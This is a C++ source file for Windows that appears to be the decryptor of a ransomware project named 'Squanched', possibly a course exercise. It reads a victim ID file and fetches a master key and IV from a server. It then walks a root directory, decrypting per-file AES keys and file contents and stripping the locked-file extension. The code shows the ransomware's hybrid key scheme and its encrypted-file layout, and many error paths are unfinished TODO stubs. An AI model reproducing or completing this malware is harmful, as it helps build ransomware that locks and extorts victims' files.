
#include "Decryption.h"


#if 1
std::string hex_to_string(const std::string& input);
DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);

DWORD DecryptKeyIV(PBYTE keyIV, PBYTE* keyIVBuff,  PBYTE masterKey, PBYTE masterIV)
{
	DWORD status;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle;
	status = getKeyHandle(masterKey, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	DWORD  resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		//TODO cleanup
	}
	memcpy(tmpIv, masterIV, IV_LEN);
	status = BCryptDecrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, nullptr, tmpIv, IV_LEN, *keyIVBuff, KEY_LEN + IV_LEN, &resSize, 0);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}

	return status;
}

DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	DWORD status;
	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] = { 0 };
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50, &res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	//TODO verify compatible block length
	

	status = BCryptGenerateSymmetricKey(
		aesHandle,                  // Algorithm provider handle
		&keyHandle,                 // A pointer to key handle
		NULL,                       // A pointer to the buffer that recieves the key object;NULL implies memory is allocated and freed by the function
		0,                          // Size of the buffer in bytes
		(PBYTE)key,                 // A pointer to a buffer that contains the key material
		KEY_LEN,                  // Size of the buffer in bytes
		0);                         // Flags
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

void DecryptData(string path, PBYTE key, PBYTE iv, PBYTE CipherText, DWORD CipherTextLength, BYTE paddingSize)
{
	DWORD status;
	PBYTE   TempInitVector = NULL;
	DWORD   TempInitVectorLength = 0;
	DWORD   ResultLength = 0;

	BCRYPT_KEY_HANDLE keyHandle;
	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	status = getKeyHandle(key, keyHandle, aesHandle);

	DWORD plainSize, resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (NULL == tmpIv) {
		//TODO cleanup
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, NULL, 0, &plainSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
	PBYTE plainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plainSize);
	if (NULL == plainText) {
		//TODO cleanup
	}
	status = BCryptDecrypt(keyHandle, CipherText, CipherTextLength, NULL, tmpIv, IV_LEN, plainText, plainSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		//TODO cleanup
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif
	string plainPath = path, ext = string(LOCKED_EXTENSION);
	string::size_type i = plainPath.find(ext);
	if(string::npos != i)
	{
		plainPath.erase(i, ext.length());
	}
	
	std::ofstream ofile(plainPath.c_str(), std::ios::binary);
	ofile.write((char*)plainText, plainSize - paddingSize);
	ofile.close();

}

void decrypt_wrapper(string path, PBYTE masterIV, PBYTE masterKey)
{
	if (!do_decrypt(path)) return;
	PBYTE keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	PBYTE keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	PBYTE iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	size_t cipherSize = getFileSize(path) - IV_LEN - KEY_LEN - IV_DIGITS_NUM;
	PBYTE cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	std::ifstream ifile;
	ifile.open(path, std::ios::binary);
#ifdef DEBUG
	cout << "file was" << (ifile.is_open() ? "" : "NOT") << "openned successfully" << endl;
#endif
	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = {0};
	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
	BYTE paddingSize = strtol(paddingSizeTmpBuff,NULL,10);
	ifile.read((char*)keyIV, IV_LEN+KEY_LEN);
	ifile.read((char*)cipher, cipherSize);
	ifile.close();
	//TODO add status read
	DecryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
	memcpy(key, keyIVBuff, KEY_LEN);
	memcpy(iv, keyIVBuff + KEY_LEN, IV_LEN);
	DecryptData(path,key,iv,cipher,cipherSize, paddingSize);
}
std::string hex_to_string(const std::string& input)
{
	static const char* const lut = "0123456789ABCDEF";
	size_t len = input.length();
	if (len & 1) throw std::invalid_argument("odd length");

	std::string output;
	output.reserve(len / 2);
	for (size_t i = 0; i < len; i += 2)
	{
		char a = input[i];
		const char* p = std::lower_bound(lut, lut + 16, a);
		if (*p != a) throw std::invalid_argument("not a hex digit");

		char b = input[i + 1];
		const char* q = std::lower_bound(lut, lut + 16, b);
		if (*q != b) throw std::invalid_argument("not a hex digit");

		output.push_back(((p - lut) << 4) | (q - lut));
	}
	return output;
}
int main()
{
	PBYTE masterIV = nullptr, masterKey = nullptr;
	Status status;
	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(masterIV == nullptr)
	{
		//TODO cleanup
	}
	masterKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	if (masterKey == nullptr)
	{
		//TODO cleanup
	}
//	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
//	std::ifstream masterKeyIVFile;
//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
//	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
//	masterKeyIVFile.read((char*)masterIV, IV_LEN);
//	masterKeyIVFile.close();
	string pathToID = get_home() + R"(\SquanchedID.id)";
	std::ifstream idFile;
	idFile.open(pathToID, std::ios::binary);
	std::string id((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
	idFile.close();
	id = string_to_hex(id);
	string sMasterIV, sMasterKey;
	status = getFromServer(id, sMasterIV, sMasterKey);
	//TODO Check status
	sMasterIV = hex_to_string(sMasterIV);
	sMasterKey = hex_to_string(sMasterKey);
	masterIV = (BYTE*)sMasterIV.c_str();
	masterKey = (BYTE*)sMasterKey.c_str();
	string path = ROOT_DIR;
	iterate(path, &decrypt_wrapper, masterIV, masterKey);

	//HeapFree(cipher);
	return 0;
}

#endif